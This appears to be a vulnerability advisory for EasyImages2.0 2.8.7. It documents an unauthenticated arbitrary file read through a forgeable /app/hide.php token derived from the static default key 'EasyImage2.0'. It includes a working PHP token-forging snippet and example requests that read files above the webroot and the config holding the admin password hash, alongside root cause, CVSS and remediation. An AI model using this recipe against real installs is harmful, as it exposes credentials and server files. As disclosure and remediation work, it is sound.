<!-- gist description (stage 6): EasyImages2.0 Arbitrary File Read -->

# EasyImages2.0 Arbitrary File Read

**CWE-330 · Unauthenticated arbitrary file read · forgeable hide.php path token (factory-default static crypto key)**

> **Vendor:** icret
> **Product:** EasyImages2.0 / EasyImage (PHP image hosting)
> **Affected version:** 2.8.7 (APP_VERSION; master branch, commit dcb9776cb9567b9280306471a66d96b4b733a0a1, 2026-08-22)
> **Affected endpoints:** GET /app/hide.php?key=<forged-token>
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

`/app/hide.php` decrypts its `key` parameter with AES-128-XTS using a key derived from `crc32($config['hide_key'])` and a hardcoded tweak, then returns `file_get_contents(APP_ROOT . <decrypted path>)` with no path normalization, no allow-list and no authentication. The factory default `hide_key` is the static string `EasyImage2.0` and is never rotated by the installer, so the key is public and tokens can be forged offline — yielding unauthenticated arbitrary file read, including files above the webroot via leading `/..` path segments.

## 2. Root Cause

| File:Line | Role |
|---|---|
| `app/hide.php:14-31` | `$_GET['key']` → `urlHash($hide_original, 1, crc32($config['hide_key']))` → `$real_path = APP_ROOT . <decrypted>` → `echo file_get_contents($real_path)` |
| `app/function.php:561-576` | `urlHash()`: AES-128-XTS, hardcoded IV/tweak `sciCuBC7orQtDhTO`, double-base64 token format |
| `config/config.php:116` | `hide_key` ships as static `'EasyImage2.0'`; installer does not rotate it |

```php
// app/hide.php (excerpt)
if (isset($_GET['key'])) {
    $hide_original = $_GET['key'];
    $real_path = APP_ROOT . urlHash($hide_original, 1, crc32($config['hide_key']));
} else {
    $real_path = APP_ROOT . '/public/images/404.png';
}
if (!is_file($real_path)) {
    $real_path = APP_ROOT . '/public/images/404.png';
}
$ex = pathinfo($real_path, PATHINFO_EXTENSION);
header("Content-Type: image/" . $ex . ";text/html; charset=utf-8");
echo file_get_contents($real_path);   // <-- arbitrary read, no containment

// app/function.php (excerpt)
$iv = 'sciCuBC7orQtDhTO';             // hardcoded tweak
if ($mode) {
    return openssl_decrypt(base64_decode($data), "AES-128-XTS", $key, 0, $iv);
}
```

No `realpath()`/containment check; `$real_path` = `APP_ROOT` string-concatenated with the decrypted attacker-controlled path.

## 3. Prerequisites

- None (no authentication).
- The shipped default `hide_key` (`EasyImage2.0`) must be in place — it is the factory value and the install wizard does not change it. If rotated, the value is recoverable via the chained delete-token flaw (see Impact).
- Paths must be rooted (leading `/`) because hide.php concatenates `APP_ROOT . path`; `/..` segments then climb out of the webroot.

## 4. Reproduction

Forge a token offline (replicating `urlHash()`, AES-128-XTS, key = `(string)crc32('EasyImage2.0')` = `"837912684"`, tweak `sciCuBC7orQtDhTO`, `base64(openssl_encrypt(path,...))`):

```php
// forge.php (harmless canary target)
$key   = (string) crc32('EasyImage2.0');            // "837912684" on every default install
$iv    = 'sciCuBC7orQtDhTO';
$token = base64_encode(openssl_encrypt('/../canary1.txt', 'AES-128-XTS', $key, 0, $iv));
echo $token;
```

Read a canary file one level above the webroot, unauthenticated:

```http
GET /app/hide.php?key=<forged-token-for- '/../canary1.txt' > HTTP/1.1

HTTP/1.1 200 OK
Content-Type: image/txt;text/html; charset=utf-8

OUT-OF-ROOT-MARKER-canary
```

Two levels above the webroot (`/../../canary2.txt`) behaves identically.

In-root sensitive file (existence/format proof only):

```http
GET /app/hide.php?key=<forged-token-for-'/config/config.php'> HTTP/1.1

HTTP/1.1 200 OK
Content-Type: image/php;text/html; charset=utf-8

<?php
$config=Array(
  ...
  'password'=>'<REDACTED> (bcrypt, 60 chars, matches account in local DB)',
  'hide_key'=>'EasyImage2.0',
  ...
```

(Verified response was the full 20,033-byte `config/config.php` source. The no-key baseline returns the 404 image — a clearly distinct response.)

## 5. Confirmed Techniques

- End-to-end on a fresh default install (PHP 8.4, stock config): offline token forgery → unauthenticated read of `/config/config.php` (20,033 bytes, containing the admin bcrypt hash — value `<REDACTED>`) and of canary files one and two levels above the webroot.
- The `hide` feature flag (`$config['hide']=0` default) does NOT gate `app/hide.php` — the endpoint is live with the feature disabled.
- Token forgery is deterministic (fixed tweak), so any path is forgeable offline once the key is known.

## 6. Impact

- Unauthenticated arbitrary file read with PHP-process privileges: application configuration containing admin credential material (bcrypt hash, `<REDACTED>`), source code, and any OS file readable by the PHP user.
- Chain: `config/config.php` also contains the values from which the delete-token key is derived (`crc32(password hash)`), giving a no-brute-force entry into the unauthenticated arbitrary file deletion flaw (separate submission for that flaw).

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (Base 7.5, High)

## 8. Remediation

1. In `hide.php`, resolve the decrypted path with `realpath()` and require it to stay inside the upload directory (e.g. `str_starts_with($real, $uploadsRoot)`); reject anything else.
2. Derive tokens from a per-install random secret via a proper KDF; rotate `hide_key` (and stop deriving it from a human-readable factory constant) during installation.
3. Do not echo the raw file with attacker-influenced `image/<ext>` Content-Type; serve from a dedicated controller with fixed headers.

## 9. References

- Project: https://github.com/icret/EasyImages2.0
- CWE-330: https://cwe.mitre.org/data/definitions/330.html
- External disclosure: https://gist.github.com/qianqiusujiu/ab422eb757039292c617fbbc0c3fd88b
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
